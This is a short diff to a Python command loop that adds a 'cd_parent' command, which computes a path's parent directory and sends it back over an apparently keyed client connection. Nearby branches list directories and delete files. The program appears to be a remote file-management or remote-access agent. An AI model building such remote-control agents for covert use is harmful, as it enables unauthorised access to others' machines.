@@ -795,6 +795,14 @@ def main():
                     with send_lock:
                         send_msg(client, list_directory(path), key)
 
+                elif command.startswith("cd_parent "):
+                    path = command.split(" ", 1)[1].strip()
+                    parent = os.path.dirname(os.path.normpath(path))
+                    if not parent or parent == path:
+                        parent = os.path.splitdrive(path)[0] + os.sep if os.path.splitdrive(path)[0] else os.sep
+                    with send_lock:
+                        send_msg(client, parent, key)
+
                 elif command.startswith("delete "):
                     filepath = command.split(" ", 1)[1]
                     try:
